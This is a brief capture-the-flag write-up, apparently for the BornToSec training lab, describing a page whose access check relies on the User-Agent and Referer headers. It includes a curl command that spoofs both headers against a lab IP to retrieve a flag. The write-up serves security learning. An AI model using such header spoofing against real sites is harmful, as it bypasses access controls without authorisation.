# Albatroz Vulnerability

## Discovery Process

1. Click on `© BornToSec` link in the footer
2. Found a page displaying an Albatroz image
3. Inspect the image and discovered hidden requirements:
   - `You must come from : "https://www.nsa.gov/".`
   - `Let's use this browser : "ft_bornToSec". It will help you a lot.`

## Vulnerability Details

- **Issue**: Server-side validation based on HTTP headers (User-Agent and Referer)
- **Required User-Agent**: `ft_bornToSec`
- **Required Referer**: `https://www.nsa.gov/`

## Exploitation

1. Use cURL to spoof the required HTTP headers:

```bash
curl \
-H "User-agent: ft_bornToSec" \
-H "Referer: https://www.nsa.gov/" \
"http://10.13.200.245/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" | grep flag
```

2. Successfully obtained the flag
